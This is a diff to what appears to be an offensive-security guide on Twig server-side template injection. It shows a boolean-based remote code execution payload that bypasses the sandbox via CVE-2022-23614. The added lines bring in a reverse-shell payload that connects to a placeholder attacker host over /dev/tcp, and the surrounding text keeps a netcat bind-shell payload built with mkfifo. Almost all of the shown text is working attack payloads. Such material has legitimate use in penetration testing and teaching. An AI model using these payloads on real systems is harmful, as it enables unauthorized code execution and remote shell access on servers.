@@ -73,7 +73,15 @@ After identification, we can try the following payloads to perform RCE:
 {{ 1 / (["id >>/dev/null && echo -n 1", "0"]|sort("system")|first == "0") }} // Boolean-Based RCE with sandbox bypass using CVE-2022-23614
 ```
 
-After confirming which payload works, we can get a shell by creating a bind shell:
+After confirming which payload works, we can get a shell by either rev or bind shell:
+
+Rev-Shell:
+```
+{{ ["bash -c 'exec bash -i >& /dev/tcp/ATTACKBOXIP/1234 0>&1'", ""] | sort('passthru') }}
+```
+Start a listener at 1234
+
+### Bind Shell:
 
 ```
 {{['rm+-f+/tmp/f;+mkfifo+/tmp/f;+cat+/tmp/f+|+/bin/sh+-i+2>&1+|+nc+-l+0.0.0.0+1234+>+/tmp/f','']|sort('passthru')}}
